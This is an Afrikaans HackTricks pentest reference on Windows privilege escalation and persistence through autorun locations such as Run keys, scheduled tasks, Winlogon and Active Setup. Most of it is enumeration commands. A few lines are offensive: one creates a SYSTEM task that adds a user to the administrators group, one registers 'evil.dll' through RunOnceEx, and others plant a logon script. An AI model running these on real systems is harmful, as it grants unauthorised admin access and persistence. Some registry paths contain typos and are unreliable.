# Voorregte-eskalasie met Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** kan gebruik word om programme tydens **opstart** uit te voer. Kyk watter binaries geprogrammeer is om tydens opstart uit te voer met:

```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```

## Geskeduleerde take

**Take** kan geskeduleer word om teen ’n **spesifieke frekwensie** te loop. Gebruik die volgende opdragte om te sien watter binaries geskeduleer is om te loop:

```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtasks.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```

'n Geaktiveerde taak wat as SYSTEM loop, verdien ondersoek, selfs wanneer die taakdefinisie en aksielêer beskerm is. [Task Scheduler vereis uitvoertoestemming op die taak om dit op aanvraag te laat loop](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks). As 'n gebruiker met lae voorregte daardie toestemming het, ondersoek die presiese aksie, veral PowerShell-skripte wat Active Directory-ACL's wysig of rekeningbeskermingsinstellings terugstel. Gaan die taak se `AllowDemandStart`-instelling na en verifieer die skrip se invoere en uitwerkings; toestemming om 'n vaste taak te begin, beteken nie op sigself dat willekeurige kode uitgevoer kan word nie.

## Vouers

Al die binaries in die **Startup-vouers sal tydens opstart uitgevoer word**. Die algemene Startup-vouers is dié wat hieronder gelys word, maar die Startup-vouer word in die register aangedui. [Lees hier om uit te vind waar.](privilege-escalation-with-autorun-binaries.md#startup-path)

```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```

'n Hoërbevoorregte gebruiker se Startup-inskrywing kan 'n beskermde script laat loop wat herhaaldelik lêers oopmaak vanuit 'n gids waarin 'n ander gebruiker kan skryf. Gaan die inskrywing se **werklike aanmeldidentiteit**, die script se invoergids en ACL's, en die presiese handeling na voordat jy dié gids as 'n eskalasiepad beskou. In die besonder: [`hh.exe` maak saamgestelde HTML Help-lêers (`.chm`) oop](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/about-the-html-help-executable-program); 'n script wat lêers wat deur die oproeper verskaf is daaraan deurgee, kruis 'n vertrouensgrens vir inhoud, selfs al kontroleer dit die lêernaam of die eerste grepe. [HTML Help-beleide kan uitvoerbare kortpaaie beperk](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/system-policies-for-shortcut-and-winhelp-commands), bevestig dus die geïnstalleerde beleid en hoe die bereikbare inhoud optree. 'n `.chm`-uitbreiding of magiese grepe alleen bewys nie code execution met hoër voorregte nie. Ondersoek die autorun, prosesopdragreël en padtoestemmings sonder om die onvertroude lêer tydens enumerasie oop te maak.

Dieselfde inhoudsgrens bestaan wanneer 'n hoërbevoorregte persoon 'n `.chm` **handmatig oopmaak** vanuit 'n dokumentasiegids wat 'n ander gebruiker kan vervang. Bevestig die presiese lêer en skryftoestemmings op die ouergids, die werklike kykeridentiteit en oopmaakgebeurtenis, en die effektiewe HTML Help-beleid. 'n Skryfbare gids of 'n versoek om dokumentasie na te gaan, bewys nie dat die hoër identiteitsvlak inhoud oopgemaak het wat deur 'n aanvaller beheer word nie.

> **TER INLIGTING**: Archive extraction-*path traversal*-kwesbaarhede (soos die een wat in WinRAR voor 7.13 misbruik is – CVE-2025-8088) kan gebruik word om **payloads direk tydens dekompressie in hierdie Startup-vouers te plaas**, wat code execution by die volgende gebruikersaanmelding tot gevolg het. Vir 'n in-diepte ondersoek van hierdie tegniek, sien:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registry

> [!TIP]
> [Nota hiervandaan](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Die **Wow6432Node**-registry-inskrywing dui aan dat jy 'n 64-bis-weergawe van Windows gebruik. Die bedryfstelsel gebruik hierdie sleutel om 'n afsonderlike aansig van HKEY_LOCAL_MACHINE\SOFTWARE te vertoon vir 32-bis-toepassings wat op 64-bis-weergawes van Windows loop.

### Run-inskrywings

**Algemeen bekende** AutoRun-registry:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Registry-sleutels bekend as **Run** en **RunOnce** is ontwerp om programme outomaties uit te voer elke keer wanneer 'n gebruiker by die stelsel aanmeld. Die opdragreël wat as 'n sleutel se datawaarde toegeken word, is beperk tot hoogstens 260 karakters.<sup>[[2]](#references)</sup>

**Service Run-inskrywings** (kan die outomatiese aanvang van dienste tydens selflaai beheer):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Op Windows Vista en latere weergawes word die **Run**- en **RunOnce**-registry-sleutels nie outomaties gegenereer nie. Inskrywings in hierdie sleutels kan programme óf direk begin óf hulle as afhanklikhede spesifiseer. Om byvoorbeeld 'n DLL-lêer tydens aanmelding te laai, kan die **RunOnceEx**-registry-sleutel saam met 'n "Depend"-sleutel gebruik word. Dit word gedemonstreer deur 'n registry-inskrywing by te voeg om "C:\temp\evil.dll" tydens stelselopstart uit te voer:<sup>[[2]](#references)</sup>

```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```

> [!TIP]
> **Exploit 1**: As jy binne enige van die genoemde registry-liggings in **HKLM** kan skryf, kan jy voorregte eskaleer wanneer ’n ander gebruiker aanmeld.

> [!TIP]
> **Exploit 2**: As jy enige van die binaries kan oorskryf wat in enige van die registry-liggings in **HKLM** aangedui word, kan jy daardie binary met ’n backdoor wysig wanneer ’n ander gebruiker aanmeld en voorregte eskaleer.

```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```

### Opstartpad

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Kortpaaie wat in die **Opstart**-lêergids geplaas word, sal dienste of toepassings outomaties laat begin wanneer ’n gebruiker aanmeld of die stelsel herbegin word. Die ligging van die **Opstart**-lêergids word in die register vir beide die **Plaaslike masjien**- en **Huidige gebruiker**-omvang gedefinieer. Dit beteken dat enige kortpad wat by hierdie gespesifiseerde **Opstart**-liggings gevoeg word, verseker dat die gekoppelde diens of program ná die aanmeld- of herbeginproses begin, wat dit ’n eenvoudige metode maak om programme te skeduleer om outomaties te loop.<sup>[[1]](#references)[[2]](#references)</sup>

> [!TIP]
> As jy enige [User] Shell Folder onder **HKLM** kan oorskryf, sal jy dit na ’n vouer onder jou beheer kan laat wys en ’n backdoor daarin kan plaas wat uitgevoer word wanneer enige gebruiker by die stelsel aanmeld, wat voorregte eskaleer.

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```

### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Hierdie per-gebruiker-registerwaarde kan na ’n script of opdrag wys wat uitgevoer word wanneer daardie gebruiker aanmeld. Dit is hoofsaaklik ’n **persistence**-primitief, omdat dit slegs in die konteks van die betrokke gebruiker loop, maar dit is steeds die moeite werd om dit tydens post-exploitation- en autoruns-oorsigte na te gaan.<sup>[[3]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> As jy hierdie waarde vir die huidige gebruiker kan skryf, kan jy uitvoering weer aktiveer wanneer die gebruiker die volgende keer interaktief aanmeld, sonder dat jy adminregte nodig het. As jy dit vir ’n ander gebruiker se hive kan skryf, kan jy kode-uitvoering verkry wanneer daardie gebruiker aanmeld.

```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```

Notas:

- Verkies volledige paaie na `.bat`-, `.cmd`-, `.ps1`- of ander launcher-lêers wat reeds deur die teikengebruiker gelees kan word.
- Dit bly voortbestaan ná afmelding/herlaai totdat die waarde verwyder word.
- Anders as `HKLM\...\Run`, verleen dit nie vanself elevation nie; dit is persistence op gebruikersomvang.

### Winlogon-sleutels

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Tipies is die **Userinit**-sleutel op **userinit.exe** gestel. As hierdie sleutel egter gewysig word, sal die gespesifiseerde uitvoerbare lêer ook deur **Winlogon** geloods word wanneer die gebruiker aanmeld. Net so is die **Shell**-sleutel bedoel om na **explorer.exe** te wys, wat die verstekdop vir Windows is.<sup>[[1]](#references)</sup>

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```

> [!TIP]
> As jy die registerwaarde of die binêre lêer kan oorskryf, sal jy voorregte kan eskaleer.

### Beleidsinstellings

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Gaan die **Run**-sleutel na.

```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```

### AlternateShell

### Verander die opdragprompt in Safe Mode

In die Windows Registry onder `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` is daar ’n **`AlternateShell`**-waarde wat by verstek op `cmd.exe` gestel is. Dit beteken dat `cmd.exe` gebruik word wanneer jy tydens opstart "Safe Mode with Command Prompt" kies (deur F8 te druk). Dit is egter moontlik om jou rekenaar so op te stel dat dit outomaties in hierdie modus begin, sonder dat jy F8 hoef te druk en dit handmatig te kies.

Stappe om ’n opstartopsie te skep wat outomaties in "Safe Mode with Command Prompt" begin:<sup>[[5]](#references)</sup>

1. Verander die eienskappe van die `boot.ini`-lêer om die read-only-, system- en hidden-vlae te verwyder: `attrib c:\boot.ini -r -s -h`
2. Maak `boot.ini` oop vir redigering.
3. Voeg ’n reël soos hierdie in: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Stoor die veranderinge aan `boot.ini`.
5. Herstel die oorspronklike lêereienskappe: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Deur die **AlternateShell**-registry-sleutel te verander, kan ’n pasgemaakte command shell opgestel word, wat moontlik ongemagtigde toegang bied.
- **Exploit 2 (PATH Write Permissions):** Skryftoestemmings vir enige deel van die stelsel se **PATH**-veranderlike, veral voor `C:\Windows\system32`, laat jou toe om ’n pasgemaakte `cmd.exe` uit te voer. Dit kan ’n backdoor wees as die stelsel in Safe Mode begin.
- **Exploit 3 (PATH and boot.ini Write Permissions):** Skryftoegang tot `boot.ini` maak dit moontlik om outomaties in Safe Mode te begin, wat ongemagtigde toegang tydens die volgende herlaai vergemaklik.

Gebruik hierdie opdragte om die huidige **AlternateShell**-instelling na te gaan:

```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```

### Geïnstalleerde komponent

Active Setup is ’n kenmerk in Windows wat **begin voordat die lessenaaromgewing volledig gelaai is**. Dit prioritiseer die uitvoering van sekere opdragte, wat moet voltooi voordat die gebruiker se aanmelding voortgaan. Hierdie proses vind plaas selfs voordat ander opstartinskrywings, soos dié in die Run- of RunOnce-registerafdelings, geaktiveer word.

Active Setup word deur die volgende registersleutels bestuur:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Binne hierdie sleutels bestaan verskeie subsleutels, elk wat met ’n spesifieke komponent ooreenstem. Sleutelwaardes van besondere belang sluit in:

- **IsInstalled:**
  - `0` dui aan dat die komponent se opdrag nie uitgevoer sal word nie.
  - `1` beteken dat die opdrag een keer vir elke gebruiker uitgevoer sal word; dit is die verstekgedrag as die `IsInstalled`-waarde ontbreek.
- **StubPath:** Definieer die opdrag wat deur Active Setup uitgevoer moet word. Dit kan enige geldige opdragreël wees, soos om `notepad` te begin.

**Sekuriteitsinsigte:**

- Deur ’n sleutel te wysig of daarin te skryf waar **`IsInstalled`** op `"1"` gestel is en ’n spesifieke **`StubPath`** het, kan ongemagtigde opdraguitvoering veroorsaak word, moontlik vir privilege escalation.
- Deur die binêre lêer waarna enige **`StubPath`**-waarde verwys, te verander, kan privilege escalation ook moontlik wees, mits daar voldoende toestemmings is.

Om die **`StubPath`**-konfigurasies oor Active Setup-komponente na te gaan, kan die volgende opdragte gebruik word:

```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```

### Browser Helper Objects

### Oorsig van Browser Helper Objects (BHOs)

Browser Helper Objects (BHOs) is DLL-modules wat ekstra funksies by Microsoft se Internet Explorer voeg. Hulle laai in Internet Explorer en Windows Explorer wanneer dit elke keer begin. Hulle uitvoering kan egter geblokkeer word deur die **NoExplorer**-sleutel op 1 te stel, wat verhoed dat hulle saam met Windows Explorer-instansies laai.<sup>[[1]](#references)</sup>

BHOs is versoenbaar met Windows 10 via Internet Explorer 11, maar word nie in Microsoft Edge ondersteun nie, die verstekblaaier in nuwer weergawes van Windows.

Om BHOs wat op ’n stelsel geregistreer is, te ondersoek, kan jy die volgende registersleutels nagaan:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Elke BHO word in die register deur sy **CLSID** verteenwoordig, wat as ’n unieke identifiseerder dien. Gedetailleerde inligting oor elke CLSID kan gevind word onder `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Om BHOs in die register na te gaan, kan die volgende opdragte gebruik word:

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```

### Internet Explorer-uitbreidings

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Let daarop dat die registry een nuwe registry-inskrywing vir elke dll sal bevat, en dat dit deur die **CLSID** voorgestel word. Jy kan die CLSID-inligting vind by `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Font Drivers

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```

### Maak-opdrag oop

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`

```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```

### Context menu COM-handlers

Explorer-contextmenuhandlers is shell-uitbreidings wat geregistreer is onder sleutels soos `HKLM\SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers` en `HKLM\SOFTWARE\Classes\Folder\shellex\ContextMenuHandlers`. ’n Handler se verstekwaarde, of soms sy sleutelnaam, is ’n CLSID. Volg dié CLSID na `HKLM\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32`; die verstekwaarde daarvan dui die DLL aan wat gelaai word wanneer die handler opgeroep word.

```powershell
reg query "HKLM\SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers" /s
reg query "HKLM\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32" /ve
Get-Acl 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32' |
  Select-Object -ExpandProperty Access
```

Gaan beide 32-bis- en 64-bis-registeraansigte na. `HKCR` voeg klasregistrasies op gebruiker- en masjienvlak saam, dus verifieer watter onderliggende sleutel ’n proses sal gebruik. ’n Identiteit met lae voorregte wat ’n `InprocServer32`-waarde op masjienvlak kan verander, kan ’n proses met meer voorregte na ’n ander DLL herlei, maar vir die eskalasie moet daardie proses die hanteerder aanroep. ’n Skryfbare DLL-pad kan ’n soortgelyke risiko skep, selfs wanneer die registerwaarde self beskerm is.

### Image File Execution Options

```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```

## SysInternals

Let daarop dat al die plekke waar jy autoruns kan vind **reeds deur**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe) deursoek word. Vir 'n **meer volledige lys van lêers wat outomaties uitgevoer word**, kan jy egter [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) van systinternals gebruik:

```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```

## Meer

**Vind meer Autoruns soos registers by** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)<sup>[[4]](#references)</sup>

## References

- [1] [Algemene volhardingsmeganismes van wanware](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [2] [MITRE ATT&CK T1547.001 – Outomatiese uitvoering by opstart of aanmelding: Register Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
- [3] [MITRE ATT&CK T1037.001 – Initialiseringskripte by opstart of aanmelding: Aanmeldingskrip (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [4] [Autoruns – Outomatiese begin-kategorieë (Probleemoplossing met die Windows Sysinternals-gereedskap, 2de uitgawe)](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [5] [Hoe kan ek ’n opstartopsie byvoeg wat ’n alternatiewe dop begin?](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [6] [Metasploit-samevatting 04/03/2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
- [7] [Metasploit PR #21032 – windows/persistence/userinit_mpr_logon_script](https://github.com/rapid7/metasploit-framework/pull/21032)
{{#include ../../banners/hacktricks-training.md}}
